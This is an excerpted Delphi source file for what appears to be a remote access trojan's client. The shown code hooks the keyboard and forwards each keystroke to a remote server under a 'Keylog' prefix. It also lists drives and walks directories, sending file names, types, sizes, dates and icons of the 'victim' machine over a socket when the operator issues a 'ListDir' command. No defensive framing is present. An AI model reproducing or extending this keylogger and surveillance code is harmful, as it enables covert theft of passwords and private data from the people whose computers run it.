...
uses
  ...
  VFrames, Clipbrd, Winapi.TlHelp32, PsAPI, Vcl.StdCtrls, ZLib;
...
begin
  ...
  begin
    WinEventHook := SetWinEventHook(EVENT_SYSTEM_FOREGROUND,
      EVENT_SYSTEM_FOREGROUND, 0, @WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
  end;
end;
...
function VKToChar(vkCode: DWORD): string;
var
...
begin
  ...
  // Convert vkCode to character using current keyboard layout
  if ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyboardState, @Buffer, 1, 0) > 0
  then
    Result := Buffer[0]
  else
    Result := '';
...
begin
  ...
  begin
    ...
    shiftPressed := (GetKeyState(VK_SHIFT) and $8000) <> 0;

    // Handle specific non-printable keys with custom labels
    case kbStruct.vkCode of
      VK_BACK:
        keyChar := '[Backspace]';
      VK_RETURN:
        keyChar := '[Enter]'#13#10;
      ...
      VK_DOWN:
        keyChar := '[Down Arrow]';
      VK_F1 .. VK_F12:
        keyChar := '[F' + IntToStr(kbStruct.vkCode - VK_F1 + 1) + ']';
        // F1 to F12 keys
    else
      // For printable keys, translate vkCode to character
      keyChar := VKToChar(kbStruct.vkCode);
    end;

    // Append the character or key name to Memo1 if it's not empty
    if keyChar <> '' then

      Form1.ClientSource.ExecCommand(0, BytesOf('Keylog|' + keyChar), False);
  end;
...
procedure SENDVICTIMDIRECTORY(strPath: string);
var
  Icon: TIcon;
...
begin
  ...
  Icon := TIcon.Create;
  try
    // Ensure strPath ends with a backslash
    if not strPath.EndsWith('\') then
      strPath := strPath + '\';

    // search for the first file or folder
    if FindFirst(strPath + '*.*', faAnyFile, SearchRec) = 0 then
    begin
      repeat
        FullPath := strPath + SearchRec.Name;

        // Get The DisplayName
        SHGetFileInfo(PChar(FullPath), 0, FileInfo, SizeOf(FileInfo), SHGFI_DISPLAYNAME);
        FileName := FileInfo.szDisplayName;

        // Get The TypeName
        SHGetFileInfo(PChar(FullPath), 0, FileInfo, SizeOf(FileInfo), SHGFI_TYPENAME);
        FileType := FileInfo.szTypeName;

        // Get The Icon That Represents The File or Folder
        SHGetFileInfo(PChar(FullPath), 0, FileInfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_SMALLICON);
        ...
        begin
          try
            // Save the ICON to a MemoryStream and stream it over the socket
            MS := TMemoryStream.Create;
            try
              Icon.SaveToStream(MS);
              MS.Position := 0;

              // Compress the icon stream
              SS := TStringStream.Create;
              try
                ZCompressStream(MS, SS);
                 Form1.ClientSource.ExecCommand(0, BytesOf('I|'  + SS.DataString), False);
              finally
                SS.Free;
              end;
            finally
            ...
            DestroyIcon(Icon.Handle); // Release the icon handle
          end;
          ...
          FileModifiedDate := DateTimeToStr(FileDateToDateTime(SearchRec.Time));

          // Send file/folder details over the socket
            Form1.ClientSource.ExecCommand(0, BytesOf('AddFileORFolder|'  + FileName + '|' + FileType + '|' + FileSize + '|' + FileModifiedDate), False);
        end;
...
begin
  ...
  begin
    TThread.Queue(nil,
      ...
      begin
        try
          ...
          try
            // Get the drives available in the system
            DriveMask := GetLogicalDrives;

            for var i := 0 to 25 do // Loop through possible drives (A to Z)
            begin
            ...
            // Now, send the drive list to the server in a similar way to clipboard
            ClientSource.ExecCommand(0,
              BytesOf('SendDrives|' + DriveList.CommaText), False);
          finally
            DriveList.Free;
          end;
        except
    ...
    if sl[0] = 'ListDir' then
  begin
    SENDVICTIMDIRECTORY(sl[1]);
  end;
